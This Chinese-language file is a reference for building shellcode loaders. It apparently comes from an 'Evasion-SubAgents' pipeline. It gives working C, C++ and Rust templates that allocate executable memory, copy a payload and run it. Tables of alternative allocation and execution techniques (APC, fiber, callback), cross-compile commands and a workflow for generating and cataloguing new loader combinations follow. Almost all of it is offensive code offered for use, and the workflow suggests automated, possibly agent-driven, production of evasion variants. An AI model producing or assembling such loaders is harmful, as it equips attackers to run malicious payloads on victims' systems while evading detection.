# Loader 架构参考

> 提取自 Evasion-SubAgents/loader_generate.md，供 [references/loader-architecture.md](references/loader-architecture.md) 引用。

## 组件模型

```
Loader = Storage × Allocator × Copier × Executor
```

每个 Loader 由 4 个组件组合而成，组件详细列表见 `loader-components-db.json`。

---

## C 模板

```c
#include <windows.h>

unsigned char shellcode[] = { /* payload bytes */ };

int main() {
    // ALLOCATOR: VirtualAlloc
    LPVOID addr = VirtualAlloc(NULL, sizeof(shellcode),
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // COPIER: memcpy
    memcpy(addr, shellcode, sizeof(shellcode));

    // EXECUTOR: function pointer
    ((void(*)())addr)();

    return 0;
}
```

## C++ 模板

```cpp
#include <windows.h>
#include <vector>

class Loader {
public:
    bool execute(const std::vector<uint8_t>& shellcode) {
        LPVOID addr = VirtualAlloc(NULL, shellcode.size(),
                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!addr) return false;
        memcpy(addr, shellcode.data(), shellcode.size());
        ((void(*)())addr)();
        return true;
    }
};
```

## Rust 模板

```rust
use windows::Win32::System::Memory::*;

fn main() {
    let shellcode: Vec<u8> = vec![/* payload bytes */];
    unsafe {
        let addr = VirtualAlloc(None, shellcode.len(),
                                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());
        let func: extern "C" fn() = std::mem::transmute(addr);
        func();
    }
}
```

---

## Allocator 模板速查

| 方法 | 代码 | 复杂度 |
|------|------|--------|
| VirtualAlloc | `VirtualAlloc(NULL, size, MEM_COMMIT\|MEM_RESERVE, PAGE_EXECUTE_READWRITE)` | simple |
| HeapCreate | `HANDLE h = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); HeapAlloc(h, 0, size)` | medium |
| NtAllocateVirtualMemory | `NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &size, ...)` | complex |

## Executor 模板速查

| 方法 | 代码 | 复杂度 |
|------|------|--------|
| 函数指针 | `((void(*)())addr)()` | simple |
| CreateThread | `CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL)` | simple |
| EnumWindows 回调 | `EnumWindows((WNDENUMPROC)addr, NULL)` | medium |
| APC | `QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), 0); SleepEx(0, TRUE)` | medium |
| Fiber | `ConvertThreadToFiber(NULL); CreateFiber(0, (LPFIBER_START_ROUTINE)addr, NULL)` | complex |

---

## 编译命令

```bash
# C (mingw)
x86_64-w64-mingw32-gcc -o loader.exe loader.c

# C++ (mingw)
x86_64-w64-mingw32-g++ -o loader.exe loader.cpp

# Rust (cross)
cargo build --release --target x86_64-pc-windows-gnu
```

## 流程规则

1. **先查** `loader-scenarios.json` 避免重复已有组合
2. 选择 4 组件组合
3. 选择语言生成代码
4. 交叉编译验证
5. 新场景记录到知识库
